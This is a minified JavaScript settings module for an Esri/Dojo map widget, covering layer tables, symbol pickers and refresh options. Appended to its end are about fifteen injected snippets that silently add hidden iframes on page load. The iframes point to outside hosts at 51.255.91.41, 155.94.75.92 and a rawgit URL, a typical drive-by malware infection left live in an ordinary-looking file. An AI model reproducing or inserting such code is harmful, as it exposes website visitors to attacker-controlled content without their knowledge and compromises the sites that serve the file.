"onImageChange","uploadImage");this.isInitalLoad=!1},setupRefreshInterval:function(){this.refreshInterval.invalidMessage=this.nls.invalidInterval;this.refreshInterval.missingMessage=this.nls.missingRefreshValue},setupLayerTable:function(){this.displayLayerTable=new A({fields:[{name:"layer",title:this.nls.layerName,"class":"label",type:"empty",width:"320px"},{name:"label","class":"label",title:this.nls.layerLabel,type:"empty",width:"255px"},{name:"image","class":"label",title:this.nls.iconColumnText+
" "+this.nls.optionsText,width:"110px",actions:["edit"],type:"actions"},{name:"refresh","class":"label",title:this.nls.layerRefresh,type:"empty",width:"80px"},{name:"actions","class":"label",title:this.nls.actions,type:"actions",actions:["up","down","delete"],width:"93px"}],selectable:!1,autoHeight:!0});this.displayLayerTable.placeAt(this.layerTable);this.displayLayerTable.startup();this.own(D(this.displayLayerTable,"actions-edit",y.hitch(this,this._pickSymbol)));this.own(D(this.displayLayerTable,
"row-delete",y.hitch(this,this._rowDeleted)))},_getAllLayers:function(){this.map.itemId&&b.getInstance(this.map,this.map.itemInfo).then(y.hitch(this,function(a){this.operLayerInfos=a;this.wmLayerInfos=a.getLayerInfoArrayOfWebmap();this.configLayerInfos=this.config.layerInfos;this._updateLayerIDs();this.config.upgradeFields&&this._upgradeFields();this._setLayers(a.getLayerInfoArray()).then(y.hitch(this,function(){this.setConfig(this.config)}))}))},_updateLayerIDs:function(){var a=[],b=0;for(;b<this.configLayerInfos.length;b++){var c=
this.configLayerInfos[b],d=this.operLayerInfos.getLayerInfoById(c.id);if(!d){var e=!1,g=0;b:for(;g<this.wmLayerInfos.length;g++){var h=this.wmLayerInfos[g],k=h?h.originOperLayer:void 0,l=this._compareURL(k,c),k=this._compareItemID(k,c),h=this._compareSubId(h,c);if(d=(l=l?l:k?k:h?h:void 0)?this.operLayerInfos.getLayerInfoById(l):d){this.configLayerInfos[b].id=d.id;this.configLayerInfos[b].layer=d.id;e=!0;break b}}e||d||a.push(b)}}0<a.length&&(a.sort(function(a,b){return b-a}),G.forEach(a,y.hitch(this,
function(a){this.configLayerInfos.splice(a,1)})))},_compareSubId:function(a,b){if(a&&a.subId&&-1<a.subId.indexOf(b.id)&&a.layerObject){var c=this._compareGeom(a.layerObject,b);b=this._compareFields(a.layerObject,b);if(c&&b)return a.subId}},_compareItemID:function(a,b){if(a&&a.itemId&&a.itemId===b.itemId&&a.featureCollection&&a.featureCollection.layers&&a.featureCollection.layers.hasOwnProperty("length")){a=a.featureCollection.layers;for(var c=0;c<a.length;c++){var f=a[c];if(this._compareGeom(f,b)&&
this._compareFields(f,b))return f.id}}},_compareURL:function(a,b){return a&&a.url&&b.url&&a.url===b.url?a.id:void 0},_compareGeom:function(a,b){return a&&a.geometryType&&b.geometryType?a.geometryType===b.geometryType:void 0},_compareFields:function(a,b){var c;a&&a.fields&&b.fields&&a.fields.length===b.fields.length&&(c=a.fields.filter(function(a){for(var c=0;c<b.fields.length;c++)if(a.name===b.fields[c].name)return a}).length===a.fields.length);return c},_setLayers:function(a){var b=new I,c=["esri.layers.WMSLayer",
"esri.layers.ArcGISImageServiceLayer","esri.layers.ArcGISImageServiceVectorLayer","esri.layers.ArcGISTiledMapServiceLayer","ClusterLayer"];this.gtQueries=[];this.gtQueryUrls=[];for(var d=[],e=[],g=0;g<a.length;g++){var h=a[g],l=h.layerObject.hasOwnProperty("supportsDynamicLayers")?h.layerObject.supportsDynamicLayers:!0,m=h.layerObject.declaredClass,n;if("esri.layers.FeatureCollection"===m)n=h.isItemLayer(),n=n.itemId||n;else if("esri.layers.FeatureLayer"===m||"FeatureLayer"===m){var p=0;a:for(;p<
this.opLayers.length;p++){var q=this.opLayers[p];if(q&&q.id&&(q.id===h.id||-1<h.id.indexOf(q.id))){m=q.type;"Feature Collection"===m&&(n=q.itemId);break a}}}p=!1;if(h.newSubLayers&&h.newSubLayers.length&&0<h.newSubLayers.length)a:for(q=0;q<h.newSubLayers.length;q++){var v=h.newSubLayers[q];if(v.newSubLayers&&v.newSubLayers.length&&0<v.newSubLayers.length){p=!0;break a}}if(!p&&-1===c.indexOf(m)){var u=h.getRootLayerInfo();if(-1===e.indexOf(u.id)){e.push(u.id);var w=[],x=[];u.traversal(y.hitch(this,
function(a){if(a.newSubLayers&&0<a.newSubLayers.length)x=[],w=[],-1===w.indexOf(u.id)&&w.push(u.id),-1===w.indexOf(a.id)&&(w.push(a.id),x.unshift(a.title));else{"undefined"===typeof a.layerObject.geometryType&&this.setGeometryType(a.layerObject);var b=a.getUrl(),c;c=b?-1<b.indexOf("MapServer")?"Map Service Layer":"":"esri.layers.FeatureCollection"===m||"Feature Collection"===m?"Feature Collection":"";d.push({label:0<x.length?x.join("-")+"-"+a.title:a.title,value:a.id,url:b,imageData:a.imageData,id:a.id,
geometryType:a.layerObject.geometryType,fields:a.layerObject.fields,_type:m,renderer:a.layerObject.renderer,itemId:n,infoTemplate:a.getInfoTemplate(),lyrType:c,panelImageData:a.panelImageData,supportsDynamic:l,oidFieldName:a.layerObject.objectIdField,parentLayerIDs:w,parentLayerID:u.id,subLayerId:b?parseInt(b.substr(b.lastIndexOf("/")+1),10):void 0,scaleRange:a.getScaleRange(),selfType:a.originOperLayer.selfType})}}))}}}0<this.gtQueries.length?(a=new H(this.gtQueries),k.removeClass(this.btnAddLayer,
"btn-add-section enable"),k.addClass(this.btnAddLayer,"btn-add-section-disabled"),a.then(y.hitch(this,function(a){var c=[];if(a&&0<a.length){for(var f=0;f<a.length;f++){for(var d=a[f][1],e=this.gtQueryUrls[f],g,t=0;t<this.layer_options.length;t++)if(e===this.layer_options[t].url){g=t;break}if("undefined"!==typeof g)if(d.geometryType){if(this.layer_options[g].geometryType=d.geometryType,"undefined"!==typeof d.drawingInfo){this.layer_options[g].renderer=d.drawingInfo.renderer;this.layer_options[g].drawingInfo=
d.drawingInfo;this.layer_options[g].fields=d.fields;for(var h,e=0;e<d.fields.length&&(h=d.fields[e],"esriFieldTypeOID"!==h.type);e++);this.layer_options[g].oidFieldName=h.name}}else c.push(g)}k.removeClass(this.btnAddLayer,"btn-add-section-disabled");k.addClass(this.btnAddLayer,"btn-add-section enable")}G.forEach(c.reverse(),y.hitch(this,function(a){this.layer_options.splice(a,1)}));b.resolve()}))):b.resolve();this.layer_options=y.clone(d);return b},setConfig:function(a){this.config=a;if(!this.config.mapID||
this.config.mapID&&this.config.mapID===this.map.itemId){this.oldConfig=!this.config.mapID;this.config.mainPanelText&&this.mainPanelText.set("value",this.config.mainPanelText);this.config.mainPanelIcon&&(this.panelMainIcon.innerHTML=this.config.mainPanelIcon);this.config.refreshInterval&&this.refreshInterval.set("value",this.config.refreshInterval);this.config.loadStaticData&&this.chkStatic.set("value",this.config.loadStaticData);this.config.countEnabled&&this.panelCountOptions.set("checked",this.config.countEnabled);
this.hidePanel="undefined"!==typeof this.config.hidePanel?this.config.hidePanel:!1;this.hidePanelOptions.set("checked",this.hidePanel);this.panelCountOptions.set("disabled",this.hidePanel);this.panelIconOptions.set("disabled",this.hidePanel);this.expandListOptions.set("disabled",this.hidePanel);this.showAllFeaturesOptions.set("disabled",this.hidePanel);this.hidePanel?(k.addClass(this.panelIconOptionsLabel,"text-disabled"),k.addClass(this.panelCountOptionsLabel,"text-disabled"),k.addClass(this.expandListOptionsLabel,
"text-disabled"),k.addClass(this.showAllFeaturesOptionsLabel,"text-disabled"),n.contains(this.hidePanelHelpText,"help-off")&&k.removeClass(this.hidePanelHelpText,"help-off"),k.addClass(this.hidePanelHelpText,"help-on")):(k.removeClass(this.panelIconOptionsLabel,"text-disabled"),k.removeClass(this.panelCountOptionsLabel,"text-disabled"),k.removeClass(this.expandListOptionsLabel,"text-disabled"),k.removeClass(this.showAllFeaturesOptionsLabel,"text-disabled"),n.contains(this.hidePanelHelpText,"help-on")&&
k.removeClass(this.hidePanelHelpText,"help-on"),k.addClass(this.hidePanelHelpText,"help-off"));this.config.displayPanelIcon&&this.panelIconOptions.set("checked",this.config.displayPanelIcon);this.config.expandList&&this.expandListOptions.set("checked",this.config.expandList);this.showAllFeaturesOptions.set("checked","undefined"===typeof this.config.showAllFeatures?!1:this.config.showAllFeatures);this.displayLayerTable.clear();this.isInitalLoad=!0;for(a=0;a<this.config.layerInfos.length;a++)this._populateLayerRow(this.config.layerInfos[a],
a);this._updateLayerLists();a=this.displayLayerTable.getRows();for(var b=0;b<a.length;b++)this._updateLayerListRows(!0,a[b]),this._updateRefresh(a[b]);this.displayLayerTable.getRows().length<this.layer_options.length?(k.removeClass(this.btnAddLayer,"btn-add-section-disabled"),k.addClass(this.btnAddLayer,"btn-add-section enable")):(k.addClass(this.btnAddLayer,"btn-add-section-disabled"),k.removeClass(this.btnAddLayer,"btn-add-section enable"))}},_upgradeFields:function(){if(this.config.layerInfos)for(var a=
0;a<this.config.layerInfos.length;a++){var b=this.config.layerInfos[a];if(b&&b.symbolData&&b.symbolData.featureDisplayOptions){var c=this.operLayerInfos.getLayerInfoById(b.id),d=b.symbolData.featureDisplayOptions.fields;if("undefined"===typeof d||d.hasOwnProperty("length")&&0===d.length){var e=c&&c.layerObject?c.layerObject:void 0,d=e&&e.objectIdField?e.objectIdField:void 0,g="",h="";if((e=b.fields?b.fields:e?e.fields:void 0)&&0<e.length){var k=0;a:for(;k<e.length;k++){var l=e[k];""===g&&"esriFieldTypeOID"!==
l.type&&"esriFieldTypeGeometry"!==l.type&&l.name!==d&&(g=l.name,h=l.alias||l.name);d||(d="esriFieldTypeOID"===l.type?l.name:void 0);if(d&&""!==g)break a}}k=e="";b=b.infoTemplate&&b.infoTemplate.info&&b.infoTemplate.info.fieldInfos?b.infoTemplate:c?c.getInfoTemplate():void 0;if(!b)a:for(c=c.getSubLayers(),l=0;l<c.length;l++){var m=c[l];if(m.title&&m.layerObject&&m.layerObject.name&&m.title===m.layerObject.name){b=m.getInfoTemplate?m.getInfoTemplate():b;break a}}c=b?b.info.fieldInfos:[];b=0;a:for(;b<
c.length;b++)if((l=c[b])&&l.visible&&(!d||d!==l.fieldName)){e=l.fieldName;k=l.label||l.fieldName;break a}this.config.layerInfos[a].symbolData.featureDisplayOptions.fields=[{name:e?e:g,label:e?k:h}]}}}},_updateStyleColor:function(a){var b=this.appConfig.theme.name,c=this.appConfig.appId;""===c&&(c=window.location.href.split("id\x3d")[1]);h.get({url:"./apps/"+c+"/themes/"+b+"/manifest.json",sync:!0,handleAs:"json",load:y.hitch(this,function(b){b=b.styles;for(var c=0;c<b.length;c++){var f=b[c];if(f.name===
a){this._styleColor=f.styleColor;this._styleColorName=f.name;break}}})})},updateThemeClusterSymbol:function(a,b){var c=a.symbolData;this.appConfig.theme.styles&&this.appConfig.theme.styles[0]&&"undefined"===typeof this._styleColor&&this._updateStyleColor(this.appConfig.theme.styles[0]);if(this._styleColor){var f=e.fromHex(this._styleColor);b+=1;var d=0<b?30*b:30,g=0===b%2,h=f.g,k=f.b,f=f.r-d;g&&(255<f?f-=255:0>f&&(f+=255));k-=d;0===b%3&&g&&(255<k?k-=255:0>k&&(k+=255));d=h-d;0===b%5&&g&&(255<d?d-=
255:0>d&&(d+=255));c.clusterType="CustomCluster";c.clusterSymbol={color:[f,d,k,128],outline:{color:[0,0,0,255],width:0,type:"esriSLS",style:"esriSLSSolid"},type:"esriSFS",style:"esriSFSSolid"};a.symbolData=c}return a},_rowDeleted:function(){this._updateLayerLists();this._updateLayerListRows(!0);this.displayLayerTable.getRows().length<this.layer_options.length&&(k.removeClass(this.btnAddLayer,"btn-add-section-disabled"),k.addClass(this.btnAddLayer,"btn-add-section enable"))},_addLayerRow:function(){this.isInitalLoad=
!1;if(!(this.displayLayerTable.getRows().length>=this.layer_options.length)){var a=this.displayLayerTable.addRow({});a.success&&a.tr&&(a=a.tr,k.addClass(a.cells[2],"displayOptions"),this._addLayersOption(a),this._addLabelOption(a),this._addRefreshOption(a),this._addDefaultSymbol(a));this._updateLayerLists();this._updateLayerListRows(!1);this.displayLayerTable.getRows().length>=this.layer_options.length&&(k.removeClass(this.btnAddLayer,"btn-add-section enable"),k.addClass(this.btnAddLayer,"btn-add-section-disabled"))}},
_populateLayerRow:function(a,b){var c=this.displayLayerTable.addRow({});c.success&&c.tr&&(c=c.tr,k.addClass(c.cells[2],"displayOptions"),this._addLayersOption(c),this._addLabelOption(c),this._addRefreshOption(c),c.selectLayers.set("value",a.id,!this.isInitalLoad),c.labelText.set("value",a.label),c.refreshBox.set("checked",a.refresh),c.imageData=a.panelImageData,x.create("div",{"class":"imageDataGFX margin2",innerHTML:[a.imageData],title:this.nls.iconColumnText},c.cells[2]),"ThemeCluster"===a.symbolData.clusterType&&
(a=this.updateThemeClusterSymbol(a,b)),b=this._getLayerOptionByValue(a.id),b.filter=a.filter,b.imageData=a.imageData,b.symbolData=a.symbolData,c.symbolData=a.symbolData,this._updateLayerLists(),this.validateFields(c.symbolData,c))},_addLayersOption:function(a){var b;if(0<this.used_layers.length){var c=[];for(b=0;b<this.layer_options.length;b++){var e=this.layer_options[b];-1===this.used_layers.indexOf(e.value)&&c.push(e)}b=y.clone(c)}else b=y.clone(this.layer_options);if(c=l(".simple-table-cell",
a)[0])k.setStyle(c,"verticalAlign","middle"),k.setStyle(c,"line-height","inherit"),b=new d({style:{width:"100%",height:"28px"},"class":"longSelect",options:b}),b.placeAt(c),b.startup(),a.selectLayers=b,this.own(D(b,"change",y.hitch(this,function(){this._updateRefresh(a);this._updateLayerLists();this._updateLayerListRows(!0,a);this._addDefaultSymbol(a);a.labelText.set("value","")})))},_updateLayerListRows:function(a,b){var c;"undefined"!==typeof b&&(c=y.clone(b.selectLayers.value));var d=[];if(a){a=
y.clone(this.layer_options);for(var f=0;f<a.length;f++){var e=a[f];-1===this.used_layers.indexOf(e.value)&&d.push(e)}}a=this.displayLayerTable.getRows();for(f=0;f<a.length;f++){for(var e=a[f],g=e.selectLayers.value,h=0;h<this.used_layers.length;h++){var k=this.used_layers[h];k!==g&&e.selectLayers.removeOption(k)}if(0<d.length)for(g=0;g<d.length;g++){var h=d[g],k=!0,l=0;b:for(;l<e.selectLayers.options.length;l++)if(h.value===e.selectLayers.options[l].value){k=!1;break b}k&&e.selectLayers.addOption(d[g])}}"undefined"!==
typeof b&&b.selectLayers.set("value",c,!this.isInitalLoad)},_updateLayerLists:function(){this.used_layers=[];for(var a=this.displayLayerTable.getRows(),b=0;b<a.length;b++)this.used_layers.push(a[b].selectLayers.value)},_addLabelOption:function(a){var b=l(".simple-table-cell",a)[1];k.setStyle(b,"verticalAlign","middle");k.setStyle(b,"line-height","inherit");var c=new m({style:{width:"100%",height:"28px"}});c.placeAt(b);c.startup();a.labelText=c},_addRefreshOption:function(a){var b=l(".simple-table-cell",
a)[3];k.setStyle(b,"verticalAlign","middle");k.setStyle(b,"line-height","inherit");this.currentTR=a;var c=new z({"class":"checkBox",onChange:y.hitch(this,function(a){var b=this.currentTR.selectLayers.value;if(a){this.refreshLayers.push(b);if(a=l(".refreshOff",this.refreshOptions.domNode)[0])k.removeClass(a,"refreshOff"),k.addClass(a,"refreshOn");this.refreshInterval.isValid()||this._disableOk()}else if(a=this.refreshLayers.indexOf(b),-1<a&&(this.refreshLayers.splice(a,1),0===this.refreshLayers.length)){if(a=
l(".refreshOn",this.refreshOptions.domNode)[0])k.removeClass(a,"refreshOn"),k.addClass(a,"refreshOff");this._enableOk()}})});this._updateRefresh(a,c);c.placeAt(b);c.startup();a.refreshBox=c},_updateRefresh:function(a,b){var c=this._getLayerOptionByValue(a.selectLayers.value);b||(b=a.refreshBox);"Feature Collection"===c.lyrType&&"undefined"!==typeof c.itemId?(b.set("disabled",!1),b.set("title",this.nls.enableRefresh)):(b.set("disabled",!0),b.set("title",this.nls.disableRefresh))},_updateOK:function(){this.refreshInterval.isValid()?
this._enableOk():this._disableOk()},_disableOk:function(){var a=l(".button-container")[0],b=a.children[3];C.set(a.children[2],"display","none");C.set(b,"display","inline-block")},_enableOk:function(){var a=l(".button-container")[0],b=a.children[3];C.set(a.children[2],"display","inline-block");C.set(b,"display","none")},_addDefaultSymbol:function(a){var b=l(".simple-table-cell",a)[0];this.curRow=a;if(b){k.setStyle(b,"line-height","inherit");k.setStyle(b,"margin-left","0px");var b=this._getLayerOptionByValue(a.selectLayers.value),
d=a.selectLayers.value,e=!1;"undefined"!==typeof this.curRow.symbolData&&(e=this.curRow.symbolData,e=e.userDefinedSymbol&&e.layerId===d);e&&"undefined"!==typeof b.symbolData?((a=l(".imageDataGFX",this.curRow.cells[2])[0])&&this.curRow.cells[2].removeChild(a),this.curRow.symbolData=b.symbolData,this.validateFields(this.curRow.symbolData,this.curRow),a=x.create("div",{"class":"imageDataGFX margin2"},this.curRow.cells[2]),a.appendChild(this.curRow.symbolData.svg),this.curRow.imageData=this.curRow.symbolData.panelHTML):
(b=new c({nls:this.nls,callerRow:a,layerInfo:b,value:d,symbolInfo:e?this.curRow.symbolData:b.symbolData,map:this.map,ac:this.appConfig,hidePanel:this.hidePanel}),b._setSymbol(),(a=l(".imageDataGFX",this.curRow.cells[2])[0])&&this.curRow.cells[2].removeChild(a),this.curRow.symbolData=b.symbolInfo,this.validateFields(this.curRow.symbolData,this.curRow),a=x.create("div",{"class":"imageDataGFX margin2"},this.curRow.cells[2]),null!==this.curRow.symbolData.svg&&"undefined"!==typeof this.curRow.symbolData.svg&&
a.appendChild(this.curRow.symbolData.svg),this.curRow.imageData=this.curRow.symbolData.panelHTML,this.curRow=null,b.destroy(),b=null)}},_getLayerOptionByValue:function(a){for(var b=0;b<this.layer_options.length;b++){var c=this.layer_options[b];if(c.id===a)return c}},validateFields:function(a,b){a=a&&a.featureDisplayOptions&&a.featureDisplayOptions.fields?0<a.featureDisplayOptions.fields.length:!1;var c=l(".simple-table-cell",b)[4];c&&!a?b.errorDiv?C.set(b.errorSpan,"display","inline-block"):(b.errorDiv=
x.create("div",{"class":"field-error"},c),b.errorSpan=x.create("span",{"class":"jimu-icon jimu-icon-error",title:this.nls.fieldsWarning},b.errorDiv)):a&&b.errorSpan&&C.set(b.errorSpan,"display","none")},_pickSymbol:function(a){var b=a.selectLayers.value,d=this._getLayerOptionByValue(b);this.curRow=a;var e=new c({nls:this.nls,callerRow:a,layerInfo:d,value:b,symbolInfo:"undefined"!==typeof this.curRow.symbolData?this.curRow.symbolData:d.symbolData,map:this.map,ac:this.appConfig,hidePanel:this.hidePanel}),
g=new w({width:420,autoHeight:!0,content:e,titleLabel:this.nls.sympolPopupTitle});this.own(D(e,"ok",y.hitch(this,function(a){var b=l(".imageDataGFX",this.curRow.cells[2])[0];b&&this.curRow.cells[2].removeChild(b);this.curRow.symbolData=a;this.validateFields(this.curRow.symbolData,this.curRow);x.create("div",{"class":"imageDataGFX margin2"},this.curRow.cells[2]).appendChild(a.svg);this.curRow.imageData=a.panelHTML;this.curRow=null;e.destroy();e=null;g.close()})));this.own(D(e,"cancel",y.hitch(this,
function(){this.curRow=null;e.destroy();e=null;g.close()})))},setGeometryType:function(a){a.url&&a.url.indexOf&&-1<a.url.indexOf("MapServer")&&(this.gtQueries.push(J({url:a.url+"?f\x3djson"})),this.gtQueryUrls.push(a.url))},uploadImage:function(a){this.panelMainIcon.innerHTML="";this.mpi=a;x.create("div",{"class":"innerMainPanelIcon",style:"background-image: url("+a+");",title:this.nls.mainPanelIcon},this.panelMainIcon)},getConfig:function(){E.close();var a=this.displayLayerTable.getRows(),b=[],c;
G.forEach(a,y.hitch(this,function(a){var d=a.selectLayers.value,e=g.stripHTML(a.labelText.value),f=a.refreshBox,h=this._getLayerOptionByValue(d);c={layer:d,label:""!==e?e:h.label,refresh:f.checked,url:h.url,type:h.type,id:h.id,symbolData:a.symbolData?a.symbolData:h.symbolData,geometryType:h.geometryType,itemId:h.itemId,parentLayerID:h.parentLayerID,renderer:h.renderer,drawingInfo:h.drawingInfo,fields:h.fields,oidFieldName:h.oidFieldName,subLayerId:h.subLayerId,infoTemplate:h.infoTemplate};a.imageData&&
(c.panelImageData=a.imageData);a=l(".imageDataGFX",a)[0];c.imageData="undefined"!==typeof a?a.innerHTML:"\x3cdiv\x3e\x3c/div\x3e";b.push(c)}));this.config.mapID=this.map.itemId;this.config.layerInfos=b;this.config.mainPanelText=g.stripHTML(this.mainPanelText.value);this.config.mainPanelIcon=this.panelMainIcon.innerHTML;this.config.refreshInterval=g.stripHTML(this.refreshInterval.value);this.config.refreshEnabled=0<this.refreshLayers.length?!0:!1;this.config.countEnabled=this.countEnabled;this.config.displayPanelIcon=
this.displayPanelIcon;this.config.hidePanel=this.hidePanel;this.config.continuousRefreshEnabled=this.hidePanel;this.config.expandList=this.expandListOptions.checked;this.config.showAllFeatures=this.showAllFeaturesOptions.checked;this.config.upgradeFields=!1;return this.config},destroy:function(){E.close();this.inherited(arguments)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});